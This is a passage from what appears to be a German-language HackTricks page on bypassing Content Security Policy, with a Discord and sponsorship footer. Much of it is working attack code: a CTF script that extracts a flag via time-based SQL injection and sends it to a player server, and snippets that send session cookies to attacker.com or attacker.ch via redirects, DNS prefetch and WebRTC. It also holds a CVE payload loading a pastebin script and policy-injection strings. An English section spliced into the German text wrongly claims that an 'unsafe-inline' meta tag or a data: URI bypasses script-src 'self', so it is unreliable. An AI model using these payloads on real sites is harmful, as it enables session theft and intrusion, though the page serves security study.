Sie k√∂nnten auch diese Konfiguration missbrauchen, um **JavaScript-Code zu laden, der in ein Bild eingef√ºgt wurde**. Wenn die Seite beispielsweise das Laden von Bildern von Twitter erlaubt. Sie k√∂nnten ein **spezielles Bild erstellen**, es auf Twitter hochladen und das "**unsafe-inline**" missbrauchen, um einen JS-Code auszuf√ºhren (wie bei einem regul√§ren XSS), der das Bild **l√§dt**, den **JS** daraus extrahiert und **ausf√ºhrt**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Mit Service-Workern

Die Funktion **`importScripts`** von Service-Workern ist nicht durch CSP eingeschr√§nkt:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Richtlinieninjektion

**Forschung:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Wenn ein von Ihnen gesendeter **Parameter** innerhalb der **Deklaration** der **Richtlinie eingef√ºgt** wird, k√∂nnten Sie die **Richtlinie** auf eine Weise √§ndern, die **sie nutzlos macht**. Sie k√∂nnten das Skript 'unsafe-inline' mit einem dieser Umgehungen **erlauben**:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Da diese Direktive **bestehende script-src-Direktiven √ºberschreiben wird**.\
Ein Beispiel finden Sie hier: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Im Edge ist es viel einfacher. Wenn Sie im CSP nur dies hinzuf√ºgen k√∂nnen: **`;_`** w√ºrde **Edge** die gesamte **Richtlinie fallen lassen**.\
Beispiel: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; √ºber XSS (iframe) - Zeitangriff

Beachten Sie das Fehlen der Direktive `'unsafe-inline'`\
Dieses Mal k√∂nnen Sie das Opfer dazu bringen, eine Seite unter **Ihrer Kontrolle** √ºber **XSS** mit einem `<iframe` zu **laden**. Dieses Mal werden Sie das Opfer dazu bringen, die Seite aufzurufen, von der Sie Informationen extrahieren m√∂chten (**CSRF**). Sie k√∂nnen nicht auf den Inhalt der Seite zugreifen, aber wenn Sie irgendwie die **Ladezeit der Seite kontrollieren k√∂nnen**, k√∂nnen Sie die ben√∂tigten Informationen extrahieren.

Dieses Mal wird eine **Flagge** extrahiert, immer wenn ein **Zeichen richtig geraten wird** √ºber SQLi, dauert die **Antwort** aufgrund der sleep-Funktion **l√§nger**. Dann k√∂nnen Sie die Flagge extrahieren:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### √úber Bookmarklets

Dieser Angriff w√ºrde einige soziale Manipulationen implizieren, bei denen der Angreifer den Benutzer √ºberzeugt, einen Link √ºber das Bookmarklet des Browsers zu ziehen und abzulegen. Dieses Bookmarklet w√ºrde b√∂sartigen JavaScript-Code enthalten, der beim Ziehen und Ablegen oder Klicken im Kontext des aktuellen Webfensters ausgef√ºhrt wird, wodurch die CSP umgangen wird und das Stehlen sensibler Informationen wie Cookies oder Tokens erm√∂glicht wird.

F√ºr weitere Informationen [**√ºberpr√ºfen Sie den Originalbericht hier**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP-Umgehung durch Beschr√§nkung der CSP

In [**diesem CTF-Bericht**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution) wird die CSP umgangen, indem in einem erlaubten iframe eine restriktivere CSP injiziert wird, die das Laden einer bestimmten JS-Datei verhinderte, die dann √ºber **Prototyp-Verunreinigung** oder **DOM-√úberschreibung** erlaubte, einen anderen Skript zu missbrauchen, um ein beliebiges Skript zu laden.

Sie k√∂nnen die CSP eines Iframes mit dem **`csp`**-Attribut **beschr√§nken**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

In [**diesem CTF-Writeup**](https://github.com/aszx87410/ctf-writeups/issues/48) war es durch **HTML-Injection** m√∂glich, eine **CSP** weiter **einzuschr√§nken**, sodass ein Skript, das CSTI verhindert, deaktiviert wurde und somit die **Schwachstelle ausnutzbar wurde.**\
CSP kann durch Verwendung von **HTML-Meta-Tags** restriktiver gestaltet werden und Inline-Skripte k√∂nnen **deaktiviert werden**, indem der **Eintrag** entfernt wird, der ihre **Nonce** zul√§sst, und **spezifische Inline-Skripte √ºber sha aktiviert werden**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### JS Exfiltration mit Content-Security-Policy-Report-Only

Wenn es dir gelingt, den Server mit dem Header **`Content-Security-Policy-Report-Only`** und einem **von dir kontrollierten Wert** antworten zu lassen (vielleicht aufgrund eines CRLF), k√∂nntest du ihn dazu bringen, auf deinen Server zu verweisen. Wenn du den **JS-Inhalt**, den du exfiltrieren m√∂chtest, mit **`<script>`** umschlie√üt und da `unsafe-inline` h√∂chstwahrscheinlich nicht durch die CSP erlaubt ist, wird dies einen CSP-Fehler ausl√∂sen und ein Teil des Skripts (der die sensiblen Informationen enth√§lt) wird vom `Content-Security-Policy-Report-Only` an den Server gesendet.

F√ºr ein Beispiel [**siehe dieses CTF-Writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Offenlegung von Informationen mit CSP und Iframe

* Es wird ein `iframe` erstellt, das auf eine URL verweist (nennen wir sie `https://example.redirect.com`), die von CSP erlaubt ist.
* Diese URL leitet dann auf eine geheime URL um (z. B. `https://usersecret.example2.com`), die **nicht** von CSP erlaubt ist.
* Durch das Abh√∂ren des `securitypolicyviolation`-Ereignisses kann die Eigenschaft `blockedURI` erfasst werden. Diese Eigenschaft gibt die Domain der blockierten URI preis und gibt somit die geheime Domain preis, zu der die urspr√ºngliche URL umgeleitet wurde.

Interessant ist, dass Browser wie Chrome und Firefox unterschiedliche Verhaltensweisen beim Umgang mit Iframes im Hinblick auf CSP aufweisen, was zu potenziellen Lecks sensibler Informationen aufgrund undefinierter Verhaltensweisen f√ºhren kann.

Eine weitere Technik besteht darin, die CSP selbst auszunutzen, um das geheime Subdomain abzuleiten. Diese Methode basiert auf einem bin√§ren Suchalgorithmus und der Anpassung der CSP, um bestimmte Domains einzuschlie√üen, die absichtlich blockiert sind. Wenn das geheime Subdomain beispielsweise aus unbekannten Zeichen besteht, k√∂nnen Sie iterativ verschiedene Subdomains testen, indem Sie die CSP-Richtlinie √§ndern, um diese Subdomains zu blockieren oder zuzulassen. Hier ist ein Ausschnitt, der zeigt, wie die CSP eingerichtet werden k√∂nnte, um diese Methode zu erleichtern:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Durch √úberwachung, welche Anfragen vom CSP blockiert oder zugelassen werden, kann man die m√∂glichen Zeichen in der geheimen Subdomain eingrenzen und letztendlich die vollst√§ndige URL aufdecken.

Beide Methoden nutzen die Feinheiten der CSP-Implementierung und des Verhaltens in Browsern aus, um zu zeigen, wie scheinbar sichere Richtlinien versehentlich sensible Informationen preisgeben k√∂nnen.

Trick von [**hier**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking-Einblicke**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeitnachrichten und Einblicke auf dem Laufenden

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtige Plattformupdates informiert

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit Top-Hackern zusammenzuarbeiten!

## Unsichere Technologien zum Umgehen von CSP

### PHP-Antwortpuffer√ºberlastung

PHP ist daf√ºr bekannt, die Antwort standardm√§√üig auf **4096** Bytes zu puffern. Daher, wenn PHP eine Warnung anzeigt, indem ausreichend Daten in den Warnungen bereitgestellt werden, wird die Antwort **vor dem** **CSP-Header** **gesendet**, was dazu f√ºhrt, dass der Header ignoriert wird.\
Dann besteht die Technik im Wesentlichen darin, den Antwortpuffer mit Warnungen zu f√ºllen, damit der CSP-Header nicht gesendet wird.

Idee von [**diesem Writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Fehlerseite umschreiben

Aus [**diesem Writeup**](https://blog.ssrf.kr/69) geht hervor, dass es m√∂glich war, eine CSP-Schutzma√ünahme zu umgehen, indem eine Fehlerseite geladen (m√∂glicherweise ohne CSP) und ihr Inhalt umgeschrieben wurde.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME ist eine Technik, die ein XSS (oder stark eingeschr√§nktes XSS) **in einem Endpunkt einer Seite** ausnutzt, um **andere Endpunkte derselben Herkunft zu missbrauchen.** Dies wird erreicht, indem der verwundbare Endpunkt von einer Angreiferseite geladen und dann die Angreiferseite zum echten Endpunkt in derselben Herkunft aktualisiert wird, die Sie missbrauchen m√∂chten. Auf diese Weise kann der **verwundbare Endpunkt** das **`opener`**-Objekt im **Payload** verwenden, um auf den DOM des **echten Endpunkts zuzugreifen, um ihn zu missbrauchen**. Weitere Informationen finden Sie unter:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Dar√ºber hinaus verf√ºgt **wordpress** √ºber einen **JSONP**-Endpunkt unter `/wp-json/wp/v2/users/1?_jsonp=data`, der die gesendeten Daten im Ausgabewert **reflektiert** (mit der Einschr√§nkung auf nur Buchstaben, Zahlen und Punkte).

Ein Angreifer kann diesen Endpunkt missbrauchen, um einen **SOME-Angriff** gegen WordPress durchzuf√ºhren und ihn in `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` einzubetten. Beachten Sie, dass dieses **Skript** geladen wird, weil es von 'self' **erlaubt ist**. Dar√ºber hinaus und weil WordPress installiert ist, k√∂nnte ein Angreifer den **SOME-Angriff** √ºber den **verwundbaren** **Callback**-Endpunkt missbrauchen, der die CSP **umgeht**, um einem Benutzer mehr Rechte zu geben, ein neues Plugin zu installieren...\
Weitere Informationen dazu, wie dieser Angriff durchgef√ºhrt wird, finden Sie unter [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP-Exfiltration-Bypasses

Wenn eine strenge CSP vorhanden ist, die es Ihnen nicht erlaubt, **mit externen Servern zu interagieren**, gibt es einige Dinge, die Sie immer tun k√∂nnen, um die Informationen zu exfiltrieren.

### Location

Sie k√∂nnten einfach den Standort aktualisieren, um dem Server des Angreifers die geheimen Informationen zu senden:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta-Tag

Sie k√∂nnten eine Weiterleitung durch das Einschleusen eines Meta-Tags erreichen (dies ist lediglich eine Weiterleitung, es wird kein Inhalt preisgegeben)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Um Seiten schneller zu laden, werden Browser Hostnamen in IP-Adressen aufgel√∂st und zwischengespeichert.\
Sie k√∂nnen einem Browser anzeigen, einen Hostnamen vorab aufzul√∂sen mit: `<link rel="dns-prefetch" href="something.com">`

Sie k√∂nnten dieses Verhalten missbrauchen, um **sensible Informationen √ºber DNS-Anfragen zu exfiltrieren**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
### Content Security Policy (CSP) Bypass

---

#### CSP Bypass using `script-src 'unsafe-inline'`

If a website has the following Content Security Policy:

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

You can bypass it by injecting inline JavaScript code using the `unsafe-inline` keyword:

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
```

This allows any inline script to be executed on the website, potentially opening it up to cross-site scripting (XSS) attacks.

---

#### CSP Bypass using Data URI

Another way to bypass CSP is by using Data URI to load external scripts. For example, if a website has the following CSP:

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

You can bypass it by encoding the script into a Data URI format and injecting it into the HTML:

```html
<script src="data:text/javascript;base64,Y29uc29sZS5sb2coJ2hlbGxvLCdvbWUnKTs="></script>
```

This technique can be used to execute arbitrary scripts on the website, bypassing the CSP restrictions.
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Um dies zu vermeiden, kann der Server den HTTP-Header senden:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Anscheinend funktioniert diese Technik nicht in headless Browsern (Bots).
{% endhint %}

### WebRTC

Auf mehreren Seiten kann man lesen, dass **WebRTC die `connect-src`-Richtlinie des CSP nicht √ºberpr√ºft**.

Tats√§chlich k√∂nnen Informationen durch eine _DNS-Anfrage_ preisgegeben werden. Schau dir diesen Code an:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Eine weitere Option:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## √úberpr√ºfung von CSP-Richtlinien online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Automatisches Erstellen von CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Referenzen

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

‚Äã

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking Insights**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeit-Nachrichten und Einblicke auf dem Laufenden

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtige Plattformupdates informiert

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit der Zusammenarbeit mit Top-Hackern!

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
